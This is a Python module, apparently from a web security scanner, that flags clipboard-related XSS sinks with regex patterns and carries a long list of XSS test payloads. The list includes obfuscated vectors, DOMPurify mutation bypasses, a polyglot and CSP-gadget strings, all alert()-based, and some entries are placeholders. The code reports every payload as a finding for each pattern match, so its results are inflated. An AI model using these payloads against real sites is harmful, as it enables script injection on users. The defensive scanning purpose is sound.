"""
Clipboard XSS Detection Module.

Detects XSS vulnerabilities via clipboard operations:
- navigator.clipboard.writeText() exploitation
- Paste event handler injection
- Clipboard API bypass
- Clipboard data reflection XSS
"""

import re
from typing import Dict, List, Set
from dataclasses import dataclass
from enum import Enum


class ClipboardSink(Enum):
    """Clipboard-related XSS sink types."""
    CLIPBOARD_WRITE = "clipboard_write"
    CLIPBOARD_READ = "clipboard_read"
    PASTE_EVENT = "paste_event"
    COPY_EVENT = "copy_event"
    CUT_EVENT = "cut_event"
    EXEC_COMMAND = "exec_command"


@dataclass
class ClipboardXSSVulnerability:
    """Clipboard XSS vulnerability."""
    sink: ClipboardSink
    injection_point: str
    context: str
    payload: str
    severity: str


class ClipboardXSSDetector:
    """
    Advanced clipboard XSS detector.
    Detects XSS vulnerabilities via clipboard operations.
    """

    # Clipboard API patterns
    CLIPBOARD_PATTERNS = {
        ClipboardSink.CLIPBOARD_WRITE: [
            r'navigator\.clipboard\.writeText\s*\(',
            r'navigator\.clipboard\.write\s*\(',
            r'clipboard\.writeText\s*\(',
        ],
        ClipboardSink.CLIPBOARD_READ: [
            r'navigator\.clipboard\.readText\s*\(',
            r'navigator\.clipboard\.read\s*\(',
            r'clipboard\.readText\s*\(',
        ],
        ClipboardSink.PASTE_EVENT: [
            r'addEventListener\s*\(\s*["\']paste',
            r'onpaste\s*=',
            r'\.onpaste\s*=',
        ],
        ClipboardSink.COPY_EVENT: [
            r'addEventListener\s*\(\s*["\']copy',
            r'oncopy\s*=',
            r'\.oncopy\s*=',
        ],
        ClipboardSink.CUT_EVENT: [
            r'addEventListener\s*\(\s*["\']cut',
            r'oncut\s*=',
            r'\.oncut\s*=',
        ],
        ClipboardSink.EXEC_COMMAND: [
            r'document\.execCommand\s*\(\s*["\']paste',
            r'document\.execCommand\s*\(\s*["\']copy',
            r'document\.execCommand\s*\(\s*["\']cut',
        ],
    }

    # Dangerous clipboard integration patterns
    DANGEROUS_PATTERNS = [
       # --- Direct HTML Injection Sinks ---
    r'innerHTML\s*=\s*clipboardData',
    r'outerHTML\s*=\s*clipboardData',
    r'insertAdjacentHTML\s*\([^,]*,\s*clipboardData',
    r'document\.write\s*\(\s*clipboardData',
    r'document\.writeln\s*\(\s*clipboardData',
    r'\.html\s*\(\s*clipboardData',  # jQuery .html()
    r'dangerouslySetInnerHTML\s*=\s*\{\s*__html:\s*clipboardData',  # React
    
    # --- Code Execution Sinks ---
    r'eval\s*\(\s*clipboardData',
    r'new\s+Function\s*\(\s*clipboardData',
    r'setTimeout\s*\(\s*clipboardData',
    r'setInterval\s*\(\s*clipboardData',
    
    # --- Clipboard Event Data Access & Misuse ---
    r'event\.clipboardData\.getData',
    r'\.clipboardData\.getData\s*\(\s*[\'"]text/html[\'"]',
    r'navigator\.clipboard\.readText',
    r'navigator\.clipboard\.read',
    r'clipboardData\.setData',  # Often used in clipboard hijacking to overwrite content
    r'addEventListener\s*\(\s*[\'"]paste[\'"]',  # Paste listener that may lack sanitization
    r'addEventListener\s*\(\s*[\'"]copy[\'"]',   # Copy listener that may rewrite clipboard
    
    # --- URL/Attribute Assignment from Clipboard ---
    r'location\.(href|assign|replace)\s*=\s*clipboardData',
    r'window\.open\s*\(\s*clipboardData',
    
    # --- Framework-Specific Sinks ---
    r'v-html\s*=\s*[\'"]clipboardData',  # Vue.js
    r'\[innerHTML\]\s*=\s*[\'"]clipboardData',  # Angular
    r'\{@html\s+clipboardData',  # Svelte
    ]

    # XSS payloads for clipboard testing
    CLIPBOARD_XSS_PAYLOADS = [
        # --- 1. Basic & Event Handler Vectors ---
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",  # Legacy but sometimes works

    # --- 2. Obfuscated & Encoded Payloads ---
    # JavaScript obfuscation using String.fromCharCode
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    # Base64 encoding with atob
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  # atob('alert(1)')
    # JSFuck-style (using only []()!+)
    "[][(![]+[])[+[]]+...] (truncated for brevity, JSFuck can encode any JS)",
    # Unicode escapes
    "<script>\\u0061lert(1)</script>",
    # HTML entity encoding in attribute
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    # Mixed case and tabs/newlines
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x onerror\n=alert(1)>",
    # javascript: with encoded whitespace/control characters
    "java%0ascript:alert(1)",  # Newline
    "java%09script:alert(1)",  # Tab
    "\\x0Bjavascript:alert(1)",  # Vertical tab prefix
    "\\xE2\\x80\\x89javascript:alert(1)",  # Thin space prefix

    # --- 3. Mutation XSS (mXSS) Payloads ---
    # These are safe when sanitized but "mutate" into executable code when re-parsed by the browser.
    # Classic DOMPurify bypass (math/mtext context)
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    # Noscript-based mutation
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # Deep nesting / node flattening (modern DOMPurify bypass technique)
    "<div><div><div>...[deep nesting]...<img src=x onerror=alert(1)>",
    # Payload that survives multiple parsing cycles
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",

    # --- 4. SVG-Specific Payloads ---
    # SVG can contain scripts and event handlers.
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set attributeName=onmouseover to=alert(1)>",
    "<svg><a><text x=20 y=20>Click me</text></a></svg>",  # Requires interaction
    # SVG with encoded script
    "<svg><script href=\"data:text/javascript,alert(1)\"/>",
    # SVG loaded via data URI
    "<iframe src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">",

    # --- 5. Polyglot Payloads ---
    # These are designed to work in multiple contexts (HTML, attribute, JavaScript string, etc.).
    # The "Jackmasa" polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # A more concise polyglot
    "\"><img src=x onerror=alert(1)>\".<script>alert(1)</script>",

    # --- 6. CSP Bypass & Script Gadget Payloads ---
    # These don't contain inline scripts but leverage whitelisted resources.
    # JSONP endpoint abuse (example with a common library)
    "<script src=\"https://whitelisted-domain.com/jsonp?callback=alert(1)\"></script>",
    # AngularJS gadget (if Angular is on the page and CSP allows 'unsafe-eval')
    "<div ng-app ng-csp><div ng-click=$event.view.alert(1)>Click</div></div>",
    # Script gadget via a whitelisted library with a known DOM XSS sink
    "<script src=\"https://whitelisted-cdn.com/vulnerable-library.js\"></script>",

    # --- 7. Data URI & URL-Based Payloads ---
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "javascript:alert(1)",
    "javascript://%0Aalert(1)",  # Comment-based bypass
    "vbscript:msgbox(1)",  # Legacy IE vector
    ]

    def __init__(self):
        self._detected_sinks: Set[ClipboardSink] = set()
        self._vulnerabilities: List[ClipboardXSSVulnerability] = []

    def detect_clipboard_sinks(self, js_content: str, html_content: str = "") -> Set[ClipboardSink]:
        """
        Detect clipboard-related XSS sinks.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code

        Returns:
            Set of detected clipboard sinks
        """
        combined = js_content + "\n" + html_content
        detected = set()

        for sink, patterns in self.CLIPBOARD_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    detected.add(sink)
                    break

        self._detected_sinks = detected
        return detected

    def check_dangerous_integration(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for dangerous clipboard integration patterns.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            for pattern in self.DANGEROUS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.CLIPBOARD_READ,
                            injection_point=f"line_{line_num}",
                            context="Dangerous clipboard integration with DOM sink",
                            payload=marked,
                            severity="high"
                        ))

        return vulnerabilities

    def check_paste_event_xss(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for XSS in paste event handlers.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for paste event handlers
            if re.search(r'onpaste|addEventListener.*paste', line, re.IGNORECASE):
                # Check if paste data is written to DOM
                if re.search(r'innerHTML|outerHTML|document\.write|eval|new\s+Function', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.PASTE_EVENT,
                            injection_point=f"line_{line_num}",
                            context="Paste event handler with DOM sink",
                            payload=marked,
                            severity="high"
                        ))

        return vulnerabilities

    def check_clipboard_reflection(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for clipboard data reflection XSS.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for clipboard read followed by DOM write
            if re.search(r'clipboardData|clipboard\.read|navigator\.clipboard\.read', line, re.IGNORECASE):
                # Check if data is reflected to DOM
                if re.search(r'innerHTML|outerHTML|document\.write|eval|new\s+Function', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.CLIPBOARD_READ,
                            injection_point=f"line_{line_num}",
                            context="Clipboard data reflection to DOM",
                            payload=marked,
                            severity="critical"
                        ))

        return vulnerabilities

    def check_exec_command_xss(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for XSS via execCommand clipboard operations.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for execCommand with clipboard operations
            if re.search(r'execCommand\s*\(\s*["\']paste|execCommand\s*\(\s*["\']copy', line, re.IGNORECASE):
                # Check if user input is used
                if re.search(r'event\.|request\.|user|input', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.EXEC_COMMAND,
                            injection_point=f"line_{line_num}",
                            context="execCommand clipboard operation with user input",
                            payload=marked,
                            severity="medium"
                        ))

        return vulnerabilities

    def scan_for_clipboard_xss(
        self,
        html_content: str,
        js_content: str = "",
        marker: str = "xoxss"
    ) -> List[ClipboardXSSVulnerability]:
        """
        Scan for clipboard XSS vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        sinks = self.detect_clipboard_sinks(js_content, html_content)

        if not sinks:
            return self._vulnerabilities

        # Check dangerous integration
        self._vulnerabilities.extend(self.check_dangerous_integration(js_content, marker))

        # Check paste event XSS
        if ClipboardSink.PASTE_EVENT in sinks:
            self._vulnerabilities.extend(self.check_paste_event_xss(js_content, marker))

        # Check clipboard reflection
        if ClipboardSink.CLIPBOARD_READ in sinks:
            self._vulnerabilities.extend(self.check_clipboard_reflection(js_content, marker))

        # Check execCommand XSS
        if ClipboardSink.EXEC_COMMAND in sinks:
            self._vulnerabilities.extend(self.check_exec_command_xss(js_content, marker))

        return self._vulnerabilities

    def assess_clipboard_risk(self, vulnerabilities: List[ClipboardXSSVulnerability]) -> str:
        """Assess overall clipboard XSS risk."""
        if not vulnerabilities:
            return "none"

        critical_severity = [v for v in vulnerabilities if v.severity == "critical"]
        if critical_severity:
            return "critical"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "high"

        return "medium"

    def get_clipboard_summary(self) -> Dict[str, int]:
        """Get summary of clipboard findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_sink": {
                "clipboard_write": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CLIPBOARD_WRITE),
                "clipboard_read": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CLIPBOARD_READ),
                "paste_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.PASTE_EVENT),
                "copy_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.COPY_EVENT),
                "cut_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CUT_EVENT),
                "exec_command": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.EXEC_COMMAND),
            },
        }
        return summary


__all__ = [
    "ClipboardSink",
    "ClipboardXSSDetector",
    "ClipboardXSSVulnerability",
]
